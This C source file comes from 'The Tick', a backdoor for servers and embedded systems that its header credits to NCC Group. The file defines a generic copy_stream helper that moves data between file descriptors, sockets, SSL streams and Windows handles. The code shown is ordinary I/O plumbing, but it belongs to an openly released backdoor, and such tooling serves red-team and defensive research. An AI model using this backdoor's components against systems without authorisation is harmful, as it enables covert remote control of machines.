/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#include "stream.h"

#include "tcp.h"

#ifndef TICK_FEATURES_NO_CRYPTO
#include "ssl.h"
#endif

// Helper function to copy a stream in one direction.
// Source and destination can be a file descriptor, a socket, an SSL context, or a Windows handle.
// Use the STREAM_* flags to specify the type.
// Optionally pass an amount of bytes to copy, or COPY_ALL for the whole stream.
// This is a blocking call, returns only when the copy is finished.
// Returns 0 on success, -1 on error.
int copy_stream(STREAM_T source, int src_type, STREAM_T destination, int dst_type, ssize_t count)
{
    // Cast the source and destination to all types. We'll sort out which ones to use later.
    int          src_fd     =           (int) source;
    int          dst_fd     =           (int) destination;
    int          src_sock   =           (int) source;
    int          dst_sock   =           (int) destination;
#ifndef TICK_FEATURES_NO_CRYPTO
    SSL_Context *src_ssl    = (SSL_Context *) source;
    SSL_Context *dst_ssl    = (SSL_Context *) destination;
#endif
#ifdef _WIN32
    HANDLE       src_handle =        (HANDLE) source;
    HANDLE       dst_handle =        (HANDLE) destination;
#endif

    // Byte counters.
    ssize_t copied = 0;
    ssize_t block = 0;
    ssize_t piece = 0;

    // Internal copy buffer. Just one since it's a one direction copy.
    char buffer[1024];

    // Trivial case.
    if (count == 0) return 0;

    // Argument sanitization.
    if (src_type > _STREAM_MAX || dst_type > _STREAM_MAX) {
        return -1;
    }

    // Copy loop - either forever or until we reached the byte count.
    while (count < 0 || copied < count) {
#ifdef _WIN32
        DWORD tmp = 0;
#endif

        // Read from the source.
        switch (src_type) {

        case STREAM_FD:
            block = read(src_fd, buffer, sizeof(buffer));
            break;

        case STREAM_SOCKET:
            block = recv(src_sock, buffer, sizeof(buffer), 0);
            break;

#ifndef TICK_FEATURES_NO_CRYPTO

        case STREAM_SSL:
            block = br_sslio_read(&src_ssl->ioc, buffer, sizeof(buffer));
            break;

#endif
#ifdef _WIN32

        case STREAM_HANDLE:
            tmp = 0;
            if ( ! ReadFile(src_handle, buffer, sizeof(buffer), &tmp, NULL) ) {
                block = -1;
            } else {
                block = (ssize_t) tmp;
            }
            break;

#endif

        default:
            return -1;  // shouldn't happen
        }

        // Check for loop termination condition.
        if (block < 0) {
            return -1;      // I/O error
        }
        if (block == 0) {
            if (count > 0 && copied < count) {
                return -1;  // connection interrupted
            }
            return 0;       // input stream is over
        }

        // Add the block we just read to the byte count.
        // We must do this before the writing loop.
        copied = copied + block;

        // Write into the destination.
        while (block > 0) {
            switch (dst_type) {

            case STREAM_FD:
                piece = write(dst_fd, buffer, block);
                break;

            case STREAM_SOCKET:
                piece = (ssize_t) send(dst_sock, buffer, block, 0);
                break;

#ifndef TICK_FEATURES_NO_CRYPTO

            case STREAM_SSL:
                piece = br_sslio_write(&dst_ssl->ioc, buffer, block);
                break;

#endif
#ifdef _WIN32

            case STREAM_HANDLE:
                tmp = 0;
                if ( ! WriteFile(dst_handle, buffer, block, &tmp, NULL) ) {
                    piece = -1;
                } else {
                    piece = (ssize_t) tmp;
                }
                break;

#endif

            default:
                return -1;  // shouldn't happen
            }

            // We need this since these calls don't guarantee all data is sent.
            if (piece <= 0) {
                return -1;
            }
            block = block - piece;
        }

        // Shouldn't happen but just in case...
        if (block < 0) {
            return -1;
        }
    }

#ifndef TICK_FEATURES_NO_CRYPTO

    // Before returning we need to make sure we flush the SSL buffer.
    if (dst_type == STREAM_SSL) {
        br_sslio_flush(&dst_ssl->ioc);
    }

#endif

    // Success.
    return 0;
}
